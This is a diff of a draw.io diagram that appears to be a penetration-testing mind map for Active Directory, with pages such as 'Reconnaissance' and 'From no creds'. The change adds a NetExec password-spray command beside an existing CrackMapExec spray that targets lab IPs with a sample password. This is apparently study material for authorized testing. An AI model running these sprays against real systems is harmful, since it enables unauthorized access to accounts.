@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0" version="28.2.4" pages="8">
+<mxfile host="app.diagrams.net" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0" version="28.2.7" pages="8">
   <diagram name="Reconnaissance" id="l6uARz4Kyqoon4gwFnSB">
     <mxGraphModel dx="1426" dy="798" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -122,7 +122,7 @@
     </mxGraphModel>
   </diagram>
   <diagram name="From no creds" id="es25xRgdZYHL0BZce3pH">
-    <mxGraphModel dx="2595" dy="1625" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
+    <mxGraphModel dx="2871" dy="1778" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -148,9 +148,9 @@
         <mxCell id="uoBzjgSmHts_p8Hy3lkX-3" style="edgeStyle=segmentEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;fontSize=12;fontColor=#FFFFFF;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" parent="1" source="q669wVBJVDhqwRxZ6Rot-3" target="y5aqqQjo2jUjklV6V6uS-5" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <object label="&lt;div&gt;Password spray&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#dc8add&quot;&gt;bruteforce des users pour 1 mot de passe&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#dc8add&quot;&gt;&lt;font color=&quot;#2a7bde&quot;&gt;cme&lt;/font&gt;&lt;br&gt;&lt;/font&gt;&lt;/div&gt;" spray="cme smb 192.168.50.75 -u users.txt -p &#39;Nexus123!&#39; -d corp.com --continue-on-success" id="q669wVBJVDhqwRxZ6Rot-3">
+        <object label="&lt;div&gt;Password spray&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#dc8add&quot;&gt;bruteforce des users pour 1 mot de passe&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#dc8add&quot;&gt;&lt;font color=&quot;#2a7bde&quot;&gt;cme&lt;/font&gt;&lt;br&gt;&lt;/font&gt;&lt;/div&gt;" spray="cme smb 192.168.50.75 -u users.txt -p &#39;Nexus123!&#39; -d corp.com --continue-on-success" other="nxc smb 192.168.1.101 -u user.txt -p user.txt --no-bruteforce --continue-on-success&#xa;" id="q669wVBJVDhqwRxZ6Rot-3">
           <mxCell style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;strokeColor=#e5a50a;" parent="1" vertex="1">
-            <mxGeometry x="1480" y="-59.5" width="358" height="36.25" as="geometry" />
+            <mxGeometry x="1480" y="-69" width="358" height="69.5" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-14" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.75;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;strokeColor=#2F5B7C;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" parent="1" source="3KcXfi7NhkpAm5ZNJReR-1" target="hefA_bYV9p1Cq4kSP_zY-10" edge="1">
